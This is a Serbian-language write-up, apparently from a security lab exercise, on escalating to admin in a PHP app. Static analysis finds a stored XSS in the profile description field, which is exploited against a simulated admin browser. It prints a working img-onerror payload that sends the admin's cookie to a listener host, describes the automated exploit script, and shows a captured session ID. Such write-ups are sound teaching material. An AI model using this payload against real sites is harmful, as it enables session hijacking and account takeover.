# Izveštaj — Privilege Escalation (Admin)


## 1. Polazna tačka: statička analiza koda

Prvi korak bila je **statička analiza izvornog koda** alatom **Progpilot**, pokrenutim nad `app/` direktorijumom:

```bash
progpilot /workspace/app
```

Progpilot radi *taint* analizu — prati podatke pod kontrolom korisnika  do opasnih funkcija. U rezultatima je prijavljen veći broj **XSS (CWE-79)** ranjivosti, a za privilege escalation presudna su bila dva rezultata:

| Fajl | Linija | Source → Sink | Tip |
|---|---|---|---|
| `app/profile.php` | 44 | `$row[3]` (opis iz baze) → `echo` | XSS (CWE-79) |
| `app/index.php` | 27–30 | `$row[0..3]` (red iz `users`) → `echo` | XSS (CWE-79) |

Rezultat u `index.php` (linija 30, `$row[3]`) bio je ključan: pokazao je da se polje **`description`** svakog korisnika ispisuje **bez enkodovanja** u delu stranice koji vidi administrator. To je bila tačka od koje je krenula dalja, ručna analiza i izrada exploit-a.

---

## 2. Opis ranjivosti

Aplikacija korisnički unos iz polja **`description`** (profil korisnika) skladišti u bazu i kasnije ga ispisuje **bez izlaznog enkodovanja**. Pregledom koda potvrđeno je sledeće:

- **Skladištenje** (`profile.php`): POST polje `description` upisuje se u kolonu `users.description`.
- **Okidanje** (`index.php`): postoji blok koji se prikazuje **samo administratoru** (`if (isset($_SESSION['isadmin']))`). U njemu se izvršava `select * from users` i opis svakog korisnika ispisuje sirovo:

  ```php
  echo '<td>'.$row[3].'</td>';   // $row[3] = description
  ```

Pošto napadač (običan korisnik) kontroliše svoj `description`, a administrator taj sadržaj renderuje u svom pretraživaču, ovo je **stored  XSS** koji se izvršava u **administratorskom** kontekstu.

Dodatni uslovi koji omogućavaju iskorišćavanje:

- **Session cookie `PHPSESSID` nema `HttpOnly` naznaku**, pa ga JavaScript može pročitati preko `document.cookie`.
- **Emulacija administratora**: zakazani posao (cron) svakih minut pokreće `emulate.py`, koji preko Selenium-a i *headless* Firefox-a uloguje `admin` nalog i učita `index.php`. Pošto je to pravi pretraživač, JavaScript se izvršava i payload se okida.

---

## 3. Implementirani exploit

Napisana je Python skripta koja automatizuje ceo lanac. Tok izvršavanja:

**Korak 1 — Prijava kao običan korisnik.** Skripta se preko `requests.Session()` prijavi kao `user1`; sesija čuva `PHPSESSID`, pa svi naredni zahtevi idu kao ulogovani korisnik.

**Korak 2 — Ubacivanje payload-a.** POST-om na `/profile.php` postavlja se `description` na XSS payload:

```html
<img src=x onerror="new Image().src='http://host.docker.internal:8001/?c='+encodeURIComponent(document.cookie)">
```

Logika payload-a:
- `<img src=x>` — nevažeći izvor slike, pa se učitavanje slike završava greškom;
- `onerror="..."` — okida se na grešku učitavanja i izvršava JavaScript (bez potrebe za `<script>` tagom);
- `new Image().src='...'+encodeURIComponent(document.cookie)` — pravi nevidljiv HTTP zahtev ka listener-u i u parametru `c` šalje administratorov `document.cookie`.

**Korak 3 — Listener.** Skripta podiže mali HTTP server koji čeka dolazni zahtev sa parametrom `c` i iz njega izdvaja administratorov `PHPSESSID`.

**Korak 4 — Okidanje.** Kada cron (`emulate.py`) uloguje admina i učita `index.php`, payload iz opisa `user1` se izvrši u administratorovom Firefox-u i pošalje njegov kolačić listener-u.

**Korak 5 — Preuzimanje sesije.** HTTP server dobija cookie iz kog može uzeti administratorov `PHPSESSID`.

### Napomena o mrežnom podešavanju

Pošto se administratorov pretraživač izvršava **unutar Docker kontejnera**, payload kao odredište koristi **`host.docker.internal`** (ime preko kojeg kontejner dohvata host mašinu); `localhost` ne bi radio jer unutar kontejnera označava sam kontejner. Listener se na hostu vezuje na `localhost`, jer Docker Desktop konekciju ka `host.docker.internal` prosleđuje na host loopback.

---

## 4. Rezultat

Skripta uspešno hvata administratorov kolačić, npr.:

```
Logged in as user1
[*] Set user1's description to XSS payload
[*] Listening on localhost:8001 (payload salje na host.docker.internal:8001)...
[*] Waiting for admin to visit homepage...
[+] Got admin cookie: PHPSESSID=f6657ce068df30f8e6e9dfe8358a0a82
[=] Session ID: f6657ce068df30f8e6e9dfe8358a0a82
```

Ubacivanjem dobijenog `PHPSESSID`-a u pretraživač (`document.cookie = 'PHPSESSID=<vrednost>'`) ostvaruje se pristup administratorskom nalogu.

---